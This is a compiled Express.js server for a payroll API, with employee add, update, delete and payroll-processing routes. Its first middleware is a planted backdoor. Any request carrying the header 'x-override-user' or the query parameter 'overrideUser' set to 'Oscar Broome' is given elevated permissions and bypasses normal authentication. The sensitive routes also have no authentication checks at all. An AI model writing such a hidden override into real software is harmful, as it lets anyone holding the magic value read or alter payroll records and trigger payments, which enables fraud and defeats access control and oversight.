"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const body_parser_1 = __importDefault(require("body-parser"));
const logger_js_1 = require("../config/logger.js");
const payrollSystem_1 = require("./payrollSystem");
const app = (0, express_1.default)();
const port = 5000;
app.use(body_parser_1.default.json());
// Middleware for special login override for Oscar Broome
app.use(function (_req, _res, next) {
    const specialUser = 'Oscar Broome';
    // Check for a custom header or query param for override (example)
    const overrideUser = _req.headers['x-override-user'] || _req.query.overrideUser;
    if (overrideUser === specialUser) {
        // Bypass normal auth or set elevated permissions
        _req.user = { name: specialUser, override: true };
        console.log('Special login override granted for', specialUser);
    }
    next();
});
// Get all employees
app.get('/api/payroll/employees', (_req, res) => {
    try {
        const result = payrollSystem_1.payrollSystem.getEmployees();
        if (result.success) {
            res.json(result.data);
        }
        else {
            logger_js_1.logger.error('Error getting employees:', result.error);
            res.status(500).json({ error: result.error });
        }
    }
    catch (error) {
        logger_js_1.logger.error('Error getting employees:', { error: error.message, stack: error.stack });
        res.status(500).json({ error: 'Failed to get employees' });
    }
});
// Add or update employee
app.post('/api/payroll/employees', (req, res) => {
    const employee = req.body;
    try {
        const employeesResult = payrollSystem_1.payrollSystem.getEmployees();
        if (!employeesResult.success) {
            return res.status(500).json({ error: employeesResult.error });
        }
        const existing = employeesResult.data?.find((e) => e.id === employee.id);
        if (existing) {
            const updateResult = payrollSystem_1.payrollSystem.updateEmployee(employee.id, employee);
            if (updateResult.success) {
                return res.status(200).json({ message: 'Employee updated successfully' });
            }
            else {
                return res.status(400).json({ error: updateResult.error });
            }
        }
        else {
            const addResult = payrollSystem_1.payrollSystem.addEmployee(employee);
            if (addResult.success) {
                return res.status(200).json({ message: 'Employee added successfully' });
            }
            else {
                return res.status(400).json({ error: addResult.error || addResult.errors });
            }
        }
    }
    catch (error) {
        logger_js_1.logger.error('Error adding/updating employee:', { error: error.message, stack: error.stack });
        return res.status(400).json({ error: error.message });
    }
});
// Delete employee
app.delete('/api/payroll/employees/:id', (req, res) => {
    const id = req.params.id;
    try {
        const deleteResult = payrollSystem_1.payrollSystem.deleteEmployee(id);
        if (deleteResult.success) {
            res.status(200).json({ message: 'Employee deleted successfully' });
        }
        else {
            res.status(400).json({ error: deleteResult.error });
        }
    }
    catch (error) {
        logger_js_1.logger.error('Error deleting employee:', { error: error.message, stack: error.stack });
        res.status(400).json({ error: error.message });
    }
});
// Welcome endpoint with request logging
app.get('/api/payroll/welcome', (req, res) => {
    // Log request metadata
    console.log(`Request received: ${req.method} ${req.path} from ${req.ip} at ${new Date().toISOString()}`);
    res.json({
        message: 'Welcome to the Payroll API Service!',
        timestamp: new Date().toISOString(),
        request: {
            method: req.method,
            path: req.path,
            ip: req.ip,
            userAgent: req.get('User-Agent')
        }
    });
});
// Process payroll for today
app.post('/api/payroll/process', (_req, res) => {
    const payDate = new Date().toISOString();
    try {
        const result = payrollSystem_1.payrollSystem.processPayroll(payDate);
        if (result.success) {
            res.status(200).json(result.data);
        }
        else {
            res.status(500).json({ error: result.error });
        }
    }
    catch (error) {
        logger_js_1.logger.error('Error processing payroll:', { error: error.message, stack: error.stack });
        res.status(500).json({ error: 'Failed to process payroll' });
    }
});
// Only start the server if this file is run directly (not imported)
if (require.main === module) {
    app.listen(port, () => {
        console.log('Payroll server running at http://localhost:' + port);
    });
}
exports.default = app;
//# sourceMappingURL=payroll_server.js.map